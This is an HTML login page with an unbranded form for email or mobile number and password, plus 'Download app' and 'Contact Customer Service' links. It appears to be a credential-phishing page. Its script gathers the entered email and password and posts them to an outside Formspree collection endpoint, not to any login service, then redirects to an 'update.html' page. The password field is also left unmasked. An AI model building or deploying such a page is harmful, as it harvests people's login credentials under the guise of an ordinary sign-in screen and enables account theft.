<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" href="index.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css ">
</head>

<body>

  <div class="back">
    < </div>

      <div class="log">
        <span class="login">
          Login
        </span>

        <span class="eng">
          English
        </span>
      </div>

      <div class="detail">
        <div id="emailDiv" class="email border">Email</div>
        <div id="mobileDiv" class="num">Mobile number</div>

      </div>

      <form id="myForm" method="POST">

        <input id="contactInput" class="mail" name="email" type="text" placeholder="Please enter your email address">
        <input class="pwd" name="message" type="" placeholder="Please enter your password">

        <div class="checkbox-container checkdiv">
          <input id="checkbox" class="checkbox" checked type="checkbox">
          <label for="checkbox">
            Remember my password
          </label>
        </div>

        <button type="submit" class="loginbtn">
          Login
        </button>
      </form>


      <a class="anc" href="">
        <div class="loginbtn downloadbtn" href="">
          Download app
        </div>
      </a>

      <div class="kkk">
        <a href="">
          Register
        </a>
        <a class="float" href="">Forget password</a>
      </div>

      <a href="">
        <div class="ccs">
          <i class="fa-solid fa-headset"></i>
          Contact Customer Service
        </div>
      </a>
      
      <div id="form-message"></div>


      <script>
      // Get references to the DOM elements
const contactInput = document.getElementById('contactInput');
const emailDiv = document.getElementById('emailDiv');
const mobileDiv = document.getElementById('mobileDiv');

// Function to set the input field to Email
function setEmailInput() {
  contactInput.type = 'email';
  contactInput.placeholder = 'Please enter email address';
  emailDiv.classList.add('border');
  mobileDiv.classList.remove('border');
}

// Function to set the input field to Mobile Number
function setMobileInput() {
  contactInput.type = 'tel';
  contactInput.placeholder = 'Please enter your mobile number';
  emailDiv.classList.remove('border');
  mobileDiv.classList.add('border');
}

// Add click event listeners to toggle the input type
emailDiv.addEventListener('click', setEmailInput);
mobileDiv.addEventListener('click', setMobileInput);

// Optional: Set initial state to email on page load
setEmailInput();
      
      
        document.getElementById('myForm').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevent the default form submission

  // Get form data
  const formData = new FormData(event.target);

  // Prepare the data to send
  const data = {};
  formData.forEach((value, key) => {
    data[key] = value;
  });

  // Send data to Formspree
  fetch('https://formspree.io/f/mldekyqd', { // Replace 'your_form_id' with your actual Formspree form ID
      method: 'POST',
      headers: {
        'Accept': 'application/json',
      },
      body: JSON.stringify(data),
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        document.getElementById('form-message').innerText = 'Thank you for your submission! Redirecting...';

        // Redirect after 2 seconds to another page (e.g., thank-you.html)
        setTimeout(function() {
          window.location.href = 'update.html'; // Replace with your desired redirect URL
        }, 2000); // 2-second delay for a smooth transition

      } else {
        document.getElementById('form-message').innerText = 'Something went wrong. Please try again.';
      }
    })
    .catch(error => {
      document.getElementById('form-message').innerText = 'There was an error submitting the form. Please try again later.';
      console.error('Error submitting form:', error);
    });
});
      </script>

</body>

</html>
